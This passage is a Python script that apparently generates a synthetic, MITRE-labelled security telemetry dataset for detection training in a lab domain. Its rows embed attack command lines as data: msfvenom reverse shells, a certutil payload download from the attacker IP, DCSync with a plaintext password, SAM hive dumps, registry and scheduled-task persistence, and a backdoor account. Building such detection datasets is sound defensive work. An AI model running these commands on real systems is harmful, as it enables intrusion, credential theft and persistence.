"""
SOCFusion Training Dataset Generator v2
Generates realistic Sysmon + Windows Security + Linux auditd telemetry.
Covers: Metasploit reverse shell, keylogger, credential dump, persistence,
        lateral movement, privilege escalation, defense evasion,
        reconnaissance, kerberoasting, WinRM.
Produces ~10,000+ events with balanced attack/benign ratio.
"""

import csv
import random
from datetime import datetime, timedelta

random.seed(42)

# ============================================================
# ENVIRONMENT
# ============================================================

HOSTS = {
    "SOC-DC":       "192.168.56.10",
    "SOC-CLIENT01": "192.168.56.20",
    "SOC-CLIENT02": "192.168.56.30",
    "soc-kali":     "192.168.56.40",
}

DOMAIN = "SOCFUSION.LOCAL"

USERS = {
    "SOC-DC":       ["Administrator", "SYSTEM", "svc_sql", "krbtgt", "svc_backup"],
    "SOC-CLIENT01": ["Administrator", "vikas", "SYSTEM", "NETWORK SERVICE", "LOCAL SERVICE"],
    "SOC-CLIENT02": ["Administrator", "user2", "SYSTEM", "NETWORK SERVICE"],
    "soc-kali":     ["root", "kali"],
}

NORMAL_PROCESSES = [
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\lsass.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Windows\\System32\\services.exe",
    "C:\\Windows\\System32\\wininit.exe",
    "C:\\Windows\\System32\\csrss.exe",
    "C:\\Windows\\System32\\winlogon.exe",
    "C:\\Windows\\System32\\taskhostw.exe",
    "C:\\Windows\\System32\\conhost.exe",
    "C:\\Windows\\System32\\RuntimeBroker.exe",
    "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "C:\\Windows\\System32\\SearchIndexer.exe",
    "C:\\Windows\\System32\\spoolsv.exe",
    "C:\\Windows\\System32\\WmiPrvSE.exe",
    "C:\\Windows\\System32\\dllhost.exe",
    "C:\\Windows\\System32\\msiexec.exe",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Windows\\System32\\notepad.exe",
    "C:\\Windows\\System32\\rundll32.exe",
    "C:\\Windows\\System32\\regsvr32.exe",
    "C:\\Windows\\System32\\wuauclt.exe",
    "C:\\Windows\\System32\\wermgr.exe",
    "C:\\Windows\\System32\\SgrmBroker.exe",
    "C:\\Windows\\System32\\backgroundTaskHost.exe",
    "C:\\Windows\\System32\\MoUsoCoreWorker.exe",
]

NORMAL_PORTS = [80, 443, 135, 445, 139, 53, 88, 389, 636, 3389, 8080, 5985]

COLUMNS = [
    "timestamp", "host_normalized", "source_normalized",
    "event_code", "event_type", "event_category",
    "account_target", "account_domain",
    "process_normalized", "parent_process", "command_line_normalized",
    "source_ip", "source_port", "destination_ip", "destination_port",
    "attack_stage", "attack_label", "attack_id",
    "mitre_tactic", "mitre_technique", "mitre_subtechnique",
    "confidence", "correlation_key", "telemetry_source",
    "raw_event_summary"
]

rows = []
BASE_TIME = datetime(2026, 8, 17, 8, 0, 0)

def ts(offset_seconds):
    return (BASE_TIME + timedelta(seconds=int(offset_seconds))).strftime("%Y-%m-%dT%H:%M:%S.000+0530")

def R(a, b):
    return random.randint(a, b)

def mkrow(offset, host, source, ecode, etype, ecat,
          account, domain, proc, parent, cmdline,
          src_ip, src_port, dst_ip, dst_port,
          stage, label, attack_id, tactic, technique, sub, conf,
          corr, tel, raw):
    return {
        "timestamp": ts(offset),
        "host_normalized": host,
        "source_normalized": source,
        "event_code": ecode,
        "event_type": etype,
        "event_category": ecat,
        "account_target": account,
        "account_domain": domain,
        "process_normalized": proc,
        "parent_process": parent,
        "command_line_normalized": cmdline,
        "source_ip": src_ip,
        "source_port": src_port,
        "destination_ip": dst_ip,
        "destination_port": dst_port,
        "attack_stage": stage,
        "attack_label": label,
        "attack_id": attack_id,
        "mitre_tactic": tactic,
        "mitre_technique": technique,
        "mitre_subtechnique": sub,
        "confidence": conf,
        "correlation_key": corr,
        "telemetry_source": tel,
        "raw_event_summary": raw
    }

# ============================================================
# BENIGN ROW FACTORY
# ============================================================
t_global = 0

def benign(offset, host=None, proc=None, parent=None, account=None):
    h = host or random.choice(["SOC-CLIENT01", "SOC-CLIENT02", "SOC-DC"])
    p = proc or random.choice(NORMAL_PROCESSES)
    par = parent or random.choice(NORMAL_PROCESSES)
    acc = account or random.choice(USERS[h])
    dip = random.choice(list(HOSTS.values()))
    dp = str(random.choice(NORMAL_PORTS))
    ec = random.choice(["1", "3", "5"])
    etype = {"1": "process_creation", "3": "network_connection", "5": "process_terminated"}[ec]
    return mkrow(
        offset, h, "windows_sysmon", ec, etype, "normal_operation",
        acc, DOMAIN, p, par, "",
        HOSTS[h], str(R(49152, 65535)), dip, dp,
        "normal_operation", 0, "BASELINE", "", "", "", 1.0,
        f"BASELINE|{h}|{acc}", "Sysmon", f"{etype}: {p.split(chr(92))[-1]}"
    )

# ============================================================
# PHASE 0: PRE-ATTACK BASELINE (3000 events, 8 hours)
# ============================================================
print("Phase 0: Pre-attack baseline...")
t = 0
for _ in range(3000):
    rows.append(benign(t))
    t += R(5, 100)

# ============================================================
# PHASE 1: RECONNAISSANCE
# ============================================================
print("Phase 1: Reconnaissance...")
t = 30000

RECON_CMDS = [
    ("nmap -sn 192.168.56.0/24",                              "T1046", "",         "host_discovery"),
    ("nmap -sV -O -p 1-1024 192.168.56.10",                   "T1046", "",         "port_scan"),
    ("nmap -sV -O -p 1-1024 192.168.56.20",                   "T1046", "",         "port_scan"),
    ("nmap -sV -O -p 1-1024 192.168.56.30",                   "T1046", "",         "port_scan"),
    ("nmap -A -p 445,3389,5985,88 192.168.56.20",             "T1046", "",         "service_discovery"),
    ("nmap -sU --top-ports 20 192.168.56.0/24",               "T1046", "",         "udp_scan"),
    ("nbtscan 192.168.56.0/24",                               "T1018", "",         "host_discovery"),
    ("enum4linux -a 192.168.56.20",                           "T1087", "T1087.002","smb_enum"),
    ("smbclient -L 192.168.56.20 -N",                         "T1135", "",         "share_enum"),
    ("ldapsearch -x -H ldap://192.168.56.10 -b dc=socfusion,dc=local", "T1087", "T1087.002", "ldap_enum"),
    ("crackmapexec smb 192.168.56.0/24",                      "T1046", "",         "smb_discovery"),
    ("crackmapexec smb 192.168.56.20 -u '' -p ''",            "T1110", "T1110.003","smb_null_auth"),
    ("nmap --script smb-vuln-ms17-010 192.168.56.20",         "T1595", "T1595.002","vuln_scan"),
]

for cmd, tech, sub, stage in RECON_CMDS:
    target_ip = "192.168.56.20" if "192.168.56.20" in cmd else "192.168.56.0/24"
    proc = cmd.split()[0]
    rows.append(mkrow(
        t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
        "root", "", f"/usr/bin/{proc}", "/bin/bash", cmd,
        "192.168.56.40", "", target_ip, "",
        stage, 1, "ATTACK_RECON",
        "Reconnaissance", tech, sub, 0.98,
        f"ATTACK_RECON|root|soc-kali", "Kali auditd", f"Recon: {cmd[:80]}"
    ))
    t += R(20, 90)

# Intersperse benign between recon
for _ in range(50):
    rows.append(benign(t))
    t += R(5, 30)

# ============================================================
# PHASE 2: METASPLOIT PAYLOAD GENERATION & DELIVERY
# ============================================================
print("Phase 2: Metasploit payload generation...")
t = 40000

PAYLOAD_VARIANTS = [
    ("windows/meterpreter/reverse_tcp",  "exe",  4444),
    ("windows/meterpreter/reverse_http", "exe",  8080),
    ("windows/meterpreter/reverse_https","exe",  8443),
    ("windows/x64/meterpreter/reverse_tcp","exe",4445),
    ("windows/meterpreter/bind_tcp",     "exe",  4446),
]

for i, (payload, fmt, port) in enumerate(PAYLOAD_VARIANTS):
    # msfvenom generation on Kali
    rows.append(mkrow(
        t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
        "root", "", "msfvenom", "/bin/bash",
        f"msfvenom -p {payload} LHOST=192.168.56.40 LPORT={port} -f {fmt} -o payload_{i}.{fmt}",
        "192.168.56.40", "", "", "",
        "payload_generation", 1, "ATTACK_METASPLOIT",
        "Resource Development", "T1588", "T1588.002", 0.97,
        f"ATTACK_METASPLOIT|root|soc-kali", "Kali auditd",
        f"msfvenom: {payload} LPORT={port}"
    ))
    t += R(5, 20)

# msfconsole handler
rows.append(mkrow(
    t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
    "root", "", "msfconsole", "/bin/bash",
    "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.40; set LPORT 4444; set ExitOnSession false; run -j'",
    "192.168.56.40", "", "", "",
    "handler_setup", 1, "ATTACK_METASPLOIT",
    "Command and Control", "T1059", "T1059.004", 0.99,
    "ATTACK_METASPLOIT|root|soc-kali", "Kali auditd",
    "msfconsole multi/handler started: reverse_tcp LPORT=4444 -j (background job)"
))
t += 5

# Python HTTP server for payload hosting
rows.append(mkrow(
    t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
    "root", "", "python3", "/bin/bash",
    "python3 -m http.server 80",
    "192.168.56.40", "80", "", "",
    "payload_hosting", 1, "ATTACK_METASPLOIT",
    "Command and Control", "T1102", "", 0.92,
    "ATTACK_METASPLOIT|root|soc-kali", "Kali auditd",
    "Python HTTP server started on port 80 (payload hosting)"
))
t += 10

# ============================================================
# PHASE 3: INITIAL ACCESS + REVERSE SHELL (multiple sessions)
# ============================================================
print("Phase 3: Initial access + reverse shells...")

VICTIM_CONFIGS = [
    ("SOC-CLIENT01", "192.168.56.20", "Administrator", 4444, 0),
    ("SOC-CLIENT02", "192.168.56.30", "user2",         4444, 1),
    ("SOC-CLIENT01", "192.168.56.20", "vikas",         8080, 2),
    ("SOC-CLIENT02", "192.168.56.30", "Administrator", 8443, 3),
    ("SOC-CLIENT01", "192.168.56.20", "Administrator", 4445, 4),
]

t = 42000

for session_id, (victim, victim_ip, user, c2_port, idx) in enumerate(VICTIM_CONFIGS):
    aid = f"ATTACK_METASPLOIT_S{session_id}"

    # Payload file landed (download via certutil or SMB copy)
    delivery_method = random.choice(["certutil", "smb_copy", "phishing_link"])
    if delivery_method == "certutil":
        rows.append(mkrow(
            t, victim, "windows_sysmon", "1", "process_creation", "process_execution",
            user, DOMAIN,
            "C:\\Windows\\System32\\certutil.exe", "C:\\Windows\\System32\\cmd.exe",
            f"certutil -urlcache -split -f http://192.168.56.40/payload_{idx}.exe C:\\Windows\\Temp\\svc{idx}.exe",
            victim_ip, str(R(49152, 65535)), "192.168.56.40", "80",
            "payload_delivery", 1, aid,
            "Command and Control", "T1105", "", 0.99,
            f"{aid}|{user}|{victim}", "Sysmon EventID 1",
            f"certutil download: payload_{idx}.exe → C:\\Windows\\Temp\\svc{idx}.exe"
        ))
        t += 3
        rows.append(mkrow(
            t, victim, "windows_sysmon", "3", "network_connection", "network_activity",
            user, DOMAIN,
            "C:\\Windows\\System32\\certutil.exe", "", "",
            victim_ip, str(R(49152, 65535)), "192.168.56.40", "80",
            "payload_delivery", 1, aid,
            "Command and Control", "T1105", "", 0.99,
            f"{aid}|{user}|{victim}", "Sysmon EventID 3",
            f"certutil network: {victim_ip}:eph → 192.168.56.40:80 (tool download)"
        ))
        t += 2
    else:
        rows.append(mkrow(
            t, victim, "windows_sysmon", "11", "file_creation", "file_activity",
            user, DOMAIN,
            f"C:\\Windows\\Temp\\svc{idx}.exe", "C:\\Windows\\explorer.exe", "",
            victim_ip, "", "", "",
            "payload_delivery", 1, aid,
            "Initial Access", "T1105", "", 0.96,
            f"{aid}|{user}|{victim}", "Sysmon EventID 11",
            f"FileCreate: svc{idx}.exe dropped in Temp by {delivery_method}"
        ))
        t += 2

    # Payload execution (EventID 1)
    rows.append(mkrow(
        t, victim, "windows_sysmon", "1", "process_creation", "process_execution",
        user, DOMAIN,
        f"C:\\Windows\\Temp\\svc{idx}.exe", "C:\\Windows\\explorer.exe",
        f"C:\\Windows\\Temp\\svc{idx}.exe",
        victim_ip, "", "", "",
        "payload_execution", 1, aid,
        "Execution", "T1204", "T1204.002", 0.99,
        f"{aid}|{user}|{victim}", "Sysmon EventID 1",
        f"Process created: svc{idx}.exe by {user} under explorer.exe"
    ))
    t += 1

    # Reverse TCP connection (EventID 3)
    rows.append(mkrow(
        t, victim, "windows_sysmon", "3", "network_connection", "network_activity",
        user, DOMAIN,
        f"C:\\Windows\\Temp\\svc{idx}.exe", "", "",
        victim_ip, str(R(49152, 65535)), "192.168.56.40", str(c2_port),
        "c2_connection", 1, aid,
        "Command and Control", "T1071", "T1071.001", 0.99,
        f"{aid}|{user}|{victim}", "Sysmon EventID 3",
        f"Reverse TCP: {victim}:eph → 192.168.56.40:{c2_port} (meterpreter C2)"
    ))
    t += 1

    # Kali listener accepts connection
    rows.append(mkrow(
        t, "soc-kali", "linux_auditd", "", "ACCEPT", "network_activity",
        "root", "", "msfconsole", "", "",
        "192.168.56.40", str(c2_port), victim_ip, str(R(49152, 65535)),
        "c2_session_open", 1, aid,
        "Command and Control", "T1071", "T1071.001", 0.99,
        f"{aid}|root|soc-kali", "Kali auditd",
        f"meterpreter session {session_id} opened from {victim_ip}:{c2_port}"
    ))
    t += 2

    # Process injection (EventID 8 - CreateRemoteThread)
    inject_target = random.choice(["C:\\Windows\\System32\\svchost.exe",
                                   "C:\\Windows\\System32\\notepad.exe",
                                   "C:\\Windows\\System32\\explorer.exe"])
    rows.append(mkrow(
        t, victim, "windows_sysmon", "8", "create_remote_thread", "process_execution",
        user, DOMAIN,
        inject_target, f"C:\\Windows\\Temp\\svc{idx}.exe", "",
        victim_ip, "", "", "",
        "process_injection", 1, aid,
        "Defense Evasion", "T1055", "T1055.001", 0.98,
        f"{aid}|{user}|{victim}", "Sysmon EventID 8",
        f"CreateRemoteThread: svc{idx}.exe → {inject_target.split(chr(92))[-1]} (meterpreter inject)"
    ))
    t += 2

    # cmd.exe spawned under meterpreter
    rows.append(mkrow(
        t, victim, "windows_sysmon", "1", "process_creation", "process_execution",
        user, DOMAIN,
        "C:\\Windows\\System32\\cmd.exe",
        f"C:\\Windows\\Temp\\svc{idx}.exe",
        "cmd.exe",
        victim_ip, "", "", "",
        "shell_execution", 1, aid,
        "Execution", "T1059", "T1059.003", 0.98,
        f"{aid}|{user}|{victim}", "Sysmon EventID 1",
        f"cmd.exe spawned by svc{idx}.exe (meterpreter shell session {session_id})"
    ))
    t += 2

    # Intersperse benign
    for _ in range(10):
        rows.append(benign(t, victim))
        t += R(3, 20)

    t += 100  # gap between sessions

# ============================================================
# PHASE 4: POST-EXPLOITATION DISCOVERY (per session)
# ============================================================
print("Phase 4: Post-exploitation discovery...")

DISCOVERY_CMDS = [
    ("whoami /all",                              "Discovery", "T1033", "",         "user_discovery"),
    ("whoami /priv",                             "Discovery", "T1033", "",         "user_discovery"),
    ("net user",                                 "Discovery", "T1087", "T1087.001","user_enum"),
    ("net user Administrator",                   "Discovery", "T1087", "T1087.001","user_enum"),
    ("net localgroup administrators",            "Discovery", "T1069", "T1069.001","group_enum"),
    ("net group 'Domain Admins' /domain",        "Discovery", "T1069", "T1069.002","group_enum"),
    ("net user /domain",                         "Discovery", "T1087", "T1087.002","domain_user_enum"),
    ("ipconfig /all",                            "Discovery", "T1016", "",         "network_config"),
    ("netstat -ano",                             "Discovery", "T1049", "",         "network_conn"),
    ("netstat -nao | findstr ESTABLISHED",       "Discovery", "T1049", "",         "network_conn"),
    ("route print",                              "Discovery", "T1016", "",         "network_config"),
    ("arp -a",                                   "Discovery", "T1018", "",         "host_discovery"),
    ("net view",                                 "Discovery", "T1135", "",         "share_enum"),
    ("net view /domain",                         "Discovery", "T1135", "",         "share_enum"),
    ("systeminfo",                               "Discovery", "T1082", "",         "system_info"),
    ("tasklist /v",                              "Discovery", "T1057", "",         "process_enum"),
    ("tasklist /svc",                            "Discovery", "T1057", "",         "process_enum"),
    ("wmic process list brief",                  "Discovery", "T1057", "",         "process_enum"),
    ("wmic logicaldisk get name,size,freespace", "Discovery", "T1082", "",         "disk_enum"),
    ("dir C:\\Users",                            "Discovery", "T1083", "",         "file_enum"),
    ("dir C:\\Users\\Administrator\\Desktop",    "Discovery", "T1083", "",         "file_enum"),
    ("reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "Discovery", "T1082", "", "registry_query"),
    ("wmic computersystem get domain",           "Discovery", "T1016", "",         "domain_info"),
    ("nltest /domain_trusts",                    "Discovery", "T1482", "",         "domain_trust"),
    ("net config workstation",                   "Discovery", "T1082", "",         "system_info"),
    ("wmic os get caption,version,buildnumber",  "Discovery", "T1082", "",         "system_info"),
    ("wmic nic get IPAddress,MACAddress",        "Discovery", "T1016", "",         "network_config"),
    ("sc query type= all",                       "Discovery", "T1007", "",         "service_enum"),
    ("net start",                                "Discovery", "T1007", "",         "service_enum"),
    ("schtasks /query /fo LIST /v",              "Discovery", "T1053", "T1053.005","schtask_enum"),
]

t = 50000
victims_for_discovery = ["SOC-CLIENT01", "SOC-CLIENT02", "SOC-CLIENT01"]

for vi, victim in enumerate(victims_for_discovery):
    victim_ip = HOSTS[victim]
    user = random.choice(USERS[victim])
    aid = f"ATTACK_METASPLOIT_S{vi}"
    for cmd, tactic, tech, sub, stage in DISCOVERY_CMDS:
        rows.append(mkrow(
            t, victim, "windows_sysmon", "1", "process_creation", "process_execution",
            user, DOMAIN,
            "C:\\Windows\\System32\\cmd.exe",
            f"C:\\Windows\\Temp\\svc{vi}.exe",
            cmd,
            victim_ip, "", "", "",
            stage, 1, aid,
            tactic, tech, sub, 0.95,
            f"{aid}|{user}|{victim}", "Sysmon EventID 1",
            f"Post-exploit discovery: {cmd}"
        ))
        t += R(2, 12)
    t += 200

# ============================================================
# PHASE 5: KEYLOGGER (keyscan_start / keyscan_dump)
# ============================================================
print("Phase 5: Keylogger...")

t = 60000

for session_id in range(5):
    victim = random.choice(["SOC-CLIENT01", "SOC-CLIENT02"])
    victim_ip = HOSTS[victim]
    user = random.choice(USERS[victim])
    c2_port = random.choice([4444, 8080, 8443, 4445])
    aid = f"ATTACK_METASPLOIT_S{session_id}"

    # keyscan_start: CreateRemoteThread injects hook
    rows.append(mkrow(
        t, victim, "windows_sysmon", "8", "create_remote_thread", "process_execution",
        user, DOMAIN,
        "C:\\Windows\\System32\\svchost.exe",
        f"C:\\Windows\\Temp\\svc{session_id}.exe", "",
        victim_ip, "", "", "",
        "keylogger_start", 1, aid,
        "Collection", "T1056", "T1056.001", 0.99,
        f"{aid}|{user}|{victim}", "Sysmon EventID 8",
        f"keyscan_start: meterpreter injected keyboard hook into svchost.exe (session {session_id})"
    ))
    t += 1

    # Registry keyboard hook
    rows.append(mkrow(
        t, victim, "windows_sysmon", "12", "registry_event", "registry_activity",
        user, DOMAIN,
        "C:\\Windows\\System32\\svchost.exe", "", "",
        victim_ip, "", "", "",
        "keylogger_hook_reg", 1, aid,
        "Collection", "T1056", "T1056.001", 0.97,
        f"{aid}|{user}|{victim}", "Sysmon EventID 12",
        f"RegistryEvent: HKLM\\SYSTEM\\CurrentControlSet\\Services keyboard hook set by svchost"
    ))
    t += 1

    # SetWindowsHookEx via EventID 8 (additional injection)
    rows.append(mkrow(
        t, victim, "windows_sysmon", "8", "create_remote_thread", "process_execution",
        user, DOMAIN,
        "C:\\Windows\\System32\\winlogon.exe",
        f"C:\\Windows\\Temp\\svc{session_id}.exe", "",
        victim_ip, "", "", "",
        "keylogger_hook_wl", 1, aid,
        "Collection", "T1056", "T1056.001", 0.96,
        f"{aid}|{user}|{victim}", "Sysmon EventID 8",
        f"keyscan hook: svc{session_id}.exe → winlogon.exe (capture logon keystrokes)"
    ))
    t += 2

    # Victim types (benign-looking events during capture period)
    for _ in range(R(8, 20)):
        rows.append(benign(t, victim))
        t += R(10, 60)

    # keyscan_dump: exfil over existing C2 channel
    rows.append(mkrow(
        t, victim, "windows_sysmon", "3", "network_connection", "network_activity",
        user, DOMAIN,
        f"C:\\Windows\\Temp\\svc{session_id}.exe", "", "",
        victim_ip, str(R(49152, 65535)), "192.168.56.40", str(c2_port),
        "keylogger_exfil", 1, aid,
        "Exfiltration", "T1056", "T1056.001", 0.99,
        f"{aid}|{user}|{victim}", "Sysmon EventID 3",
        f"keyscan_dump: keystroke buffer sent to C2 192.168.56.40:{c2_port} (session {session_id})"
    ))
    t += 2

    # dump written to temp file before send
    rows.append(mkrow(
        t, victim, "windows_sysmon", "11", "file_creation", "file_activity",
        user, DOMAIN,
        f"C:\\Windows\\Temp\\svc{session_id}.exe", "", "",
        victim_ip, "", "", "",
        "keylogger_file", 1, aid,
        "Collection", "T1056", "T1056.001", 0.96,
        f"{aid}|{user}|{victim}", "Sysmon EventID 11",
        f"FileCreate: C:\\Windows\\Temp\\kl_{session_id}.dat (keyscan_dump output)"
    ))
    t += 3

    # Kali receives dump
    rows.append(mkrow(
        t, "soc-kali", "linux_auditd", "", "RECV", "network_activity",
        "root", "", "msfconsole", "", "",
        "192.168.56.40", str(c2_port), victim_ip, str(R(49152, 65535)),
        "keylogger_recv", 1, aid,
        "Exfiltration", "T1056", "T1056.001", 0.98,
        f"{aid}|root|soc-kali", "Kali auditd",
        f"meterpreter: keyscan_dump received from session {session_id} ({R(200,2000)} bytes)"
    ))
    t += R(5, 20)

# ============================================================
# PHASE 6: CREDENTIAL DUMPING
# ============================================================
print("Phase 6: Credential dumping...")

t = 75000

CRED_DUMP_VARIANTS = [
    # (victim, user, technique, description)
    ("SOC-CLIENT01", "Administrator", "T1003.001", "mimikatz sekurlsa::logonpasswords"),
    ("SOC-CLIENT01", "SYSTEM",        "T1003.001", "procdump -ma lsass.exe"),
    ("SOC-CLIENT02", "Administrator", "T1003.002", "reg save HKLM\\SAM"),
    ("SOC-DC",       "Administrator", "T1003.006", "ntdsutil snapshot DCsync"),
    ("SOC-CLIENT01", "Administrator", "T1003.004", "wce -w (LSA secrets)"),
]

for victim, user, technique, desc in CRED_DUMP_VARIANTS:
    victim_ip = HOSTS[victim]
    aid = "ATTACK_CREDDUMP"

    if technique == "T1003.001":
        # lsass process access
        rows.append(mkrow(
            t, victim, "windows_sysmon", "10", "process_access", "process_execution",
            user, DOMAIN,
            "C:\\Windows\\System32\\lsass.exe",
            "C:\\Windows\\Temp\\svc.exe", "",
            victim_ip, "", "", "",
            "lsass_access", 1, aid,
            "Credential Access", "T1003", "T1003.001", 0.99,
            f"{aid}|{user}|{victim}", "Sysmon EventID 10",
            f"ProcessAccess: svc.exe → lsass.exe (LSASS memory read: {desc})"
        ))
        t += 1
        rows.append(mkrow(
            t, victim, "windows_sysmon", "11", "file_creation", "file_activity",
            user, DOMAIN, "C:\\Windows\\Temp\\svc.exe", "", "",
            victim_ip, "", "", "",
            "lsass_dump_file", 1, aid,
            "Credential Access", "T1003", "T1003.001", 0.98,
            f"{aid}|{user}|{victim}", "Sysmon EventID 11",
            f"FileCreate: lsass.dmp written ({desc})"
        ))
        t += 2

    elif technique == "T1003.002":
        for hive in ["SAM", "SYSTEM", "SECURITY"]:
            rows.append(mkrow(
                t, victim, "windows_sysmon", "1", "process_creation", "process_execution",
                user, DOMAIN,
                "C:\\Windows\\System32\\reg.exe", "C:\\Windows\\System32\\cmd.exe",
                f"reg save HKLM\\{hive} C:\\Windows\\Temp\\{hive.lower()}.save /y",
                victim_ip, "", "", "",
                "registry_dump", 1, aid,
                "Credential Access", "T1003", "T1003.002", 0.99,
                f"{aid}|{user}|{victim}", "Sysmon EventID 1",
                f"reg save HKLM\\{hive} → {hive.lower()}.save"
            ))
            t += 2

    elif technique == "T1003.006":
        # DCSync via secretsdump
        rows.append(mkrow(
            t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
            "root", "", "python3", "/bin/bash",
            "python3 secretsdump.py socfusion.local/Administrator:Attack001@123@192.168.56.10 -just-dc-ntlm",
            "192.168.56.40", "", "192.168.56.10", "445",
            "dcsync", 1, aid,
            "Credential Access", "T1003", "T1003.006", 0.99,
            f"{aid}|root|soc-kali", "Kali auditd",
            "secretsdump DCSync: replicating domain hashes from SOC-DC"
        ))
        t += 3
        # DC logs DRSUAPI replication
        rows.append(mkrow(
            t, "SOC-DC", "windows_security", "4662", "object_access", "directory_service",
            "Administrator", DOMAIN, "", "", "",
            "192.168.56.40", "", "192.168.56.10", "",
            "dcsync_dc_log", 1, aid,
            "Credential Access", "T1003", "T1003.006", 0.97,
            f"{aid}|Administrator|SOC-DC", "Windows Security EventID 4662",
            "EventID 4662: DRSUAPI replication access from 192.168.56.40 (DCSync)"
        ))
        t += 2

    elif technique == "T1003.004":
        rows.append(mkrow(
            t, victim, "windows_sysmon", "1", "process_creation", "process_execution",
            user, DOMAIN,
            "C:\\Windows\\Temp\\wce.exe", "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\Temp\\wce.exe -w",
            victim_ip, "", "", "",
            "lsa_secrets_dump", 1, aid,
            "Credential Access", "T1003", "T1003.004", 0.97,
            f"{aid}|{user}|{victim}", "Sysmon EventID 1",
            "wce.exe -w: LSA secrets dump from Windows Credential Editor"
        ))
        t += 2

    t += R(10, 30)

# ============================================================
# PHASE 7: PRIVILEGE ESCALATION
# ============================================================
print("Phase 7: Privilege escalation...")

t = 82000

PRIVESC_EVENTS = [
    # UAC bypass via eventvwr
    ("SOC-CLIENT01", "Administrator", "windows_sysmon", "1", "process_creation",
     "C:\\Windows\\System32\\eventvwr.exe", "C:\\Windows\\System32\\cmd.exe",
     "eventvwr.exe",
     "Privilege Escalation", "T1548", "T1548.002",
     "UAC bypass via eventvwr.exe hijack"),

    # getsystem token impersonation (SYSTEM process)
    ("SOC-CLIENT01", "SYSTEM", "windows_sysmon", "1", "process_creation",
     "C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\Temp\\svc0.exe",
     "cmd.exe",
     "Privilege Escalation", "T1134", "T1134.001",
     "getsystem: cmd.exe spawned as SYSTEM via token impersonation"),

    # Named pipe impersonation
    ("SOC-CLIENT01", "SYSTEM", "windows_sysmon", "17", "pipe_event",
     "C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\Temp\\svc0.exe",
     "\\pipe\\meterpreter_priv_esc",
     "Privilege Escalation", "T1134", "T1134.001",
     "Named pipe created for token impersonation (getsystem)"),

    # SeImpersonatePrivilege abuse
    ("SOC-CLIENT01", "NETWORK SERVICE", "windows_sysmon", "1", "process_creation",
     "C:\\Windows\\Temp\\juicypotato.exe", "C:\\Windows\\System32\\cmd.exe",
     "C:\\Windows\\Temp\\juicypotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}",
     "Privilege Escalation", "T1134", "T1134.002",
     "JuicyPotato: SeImpersonatePrivilege abuse → SYSTEM shell"),

    # AlwaysInstallElevated abuse
    ("SOC-CLIENT02", "user2", "windows_sysmon", "1", "process_creation",
     "C:\\Windows\\System32\\msiexec.exe", "C:\\Windows\\System32\\cmd.exe",
     "msiexec /quiet /qn /i C:\\Windows\\Temp\\evil.msi",
     "Privilege Escalation", "T1548", "T1548.002",
     "AlwaysInstallElevated: msiexec /quiet elevated install"),

    # DLL hijacking
    ("SOC-CLIENT01", "Administrator", "windows_sysmon", "7", "image_load",
     "C:\\Windows\\System32\\dllhost.exe", "", "C:\\Windows\\Temp\\wbemcomn.dll",
     "Privilege Escalation", "T1574", "T1574.001",
     "DLL hijack: C:\\Windows\\Temp\\wbemcomn.dll loaded by dllhost.exe"),
]

for victim, user, source, ecode, etype, proc, parent, cmdline, tactic, tech, sub, desc in PRIVESC_EVENTS:
    victim_ip = HOSTS[victim]
    rows.append(mkrow(
        t, victim, source, ecode, etype, "process_execution",
        user, DOMAIN, proc, parent, cmdline,
        victim_ip, "", "", "",
        "privilege_escalation", 1, "ATTACK_PRIVESC",
        tactic, tech, sub, 0.97,
        f"ATTACK_PRIVESC|{user}|{victim}", f"Sysmon EventID {ecode}",
        desc
    ))
    t += R(5, 25)

# ============================================================
# PHASE 8: PERSISTENCE
# ============================================================
print("Phase 8: Persistence...")

t = 88000

PERSIST_EVENTS = [
    ("SOC-CLIENT01", "Administrator",
     "C:\\Windows\\System32\\schtasks.exe", "C:\\Windows\\System32\\cmd.exe",
     "schtasks /create /tn \"Windows Update Helper\" /tr \"C:\\Windows\\Temp\\svc0.exe\" /sc ONLOGON /ru SYSTEM /f",
     "windows_sysmon", "1",
     "Persistence", "T1053", "T1053.005",
     "schtasks /create: WindowsUpdateHelper → svc0.exe ONLOGON SYSTEM"),

    ("SOC-CLIENT01", "Administrator",
     "C:\\Windows\\System32\\reg.exe", "C:\\Windows\\System32\\cmd.exe",
     "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WinSvc /t REG_SZ /d C:\\Windows\\Temp\\svc0.exe /f",
     "windows_sysmon", "13",
     "Persistence", "T1547", "T1547.001",
     "RegSetValue: HKCU\\Run\\WinSvc = svc0.exe (RunKey persistence)"),

    ("SOC-CLIENT01", "Administrator",
     "C:\\Windows\\System32\\reg.exe", "C:\\Windows\\System32\\cmd.exe",
     "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /t REG_SZ /d C:\\Windows\\System32\\userinit.exe,C:\\Windows\\Temp\\svc0.exe /f",
     "windows_sysmon", "13",
     "Persistence", "T1547", "T1547.004",
     "RegSetValue: Winlogon Userinit modified for persistence"),

    ("SOC-CLIENT01", "Administrator",
     "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "C:\\Windows\\System32\\svchost.exe",
     "WmiEventConsumer: payload.exe triggered on __InstanceCreationEvent",
     "windows_sysmon", "19",
     "Persistence", "T1546", "T1546.003",
     "WMI subscription: __EventFilter → svc0.exe on process creation"),

    ("SOC-DC", "Administrator",
     "C:\\Windows\\System32\\net.exe", "C:\\Windows\\System32\\cmd.exe",
     "net user backdoor Attack001@123 /add /domain",
     "windows_sysmon", "1",
     "Persistence", "T1136", "T1136.002",
     "net user /add /domain: backdoor account created in SOCFUSION.LOCAL"),

    ("SOC-DC", "Administrator",
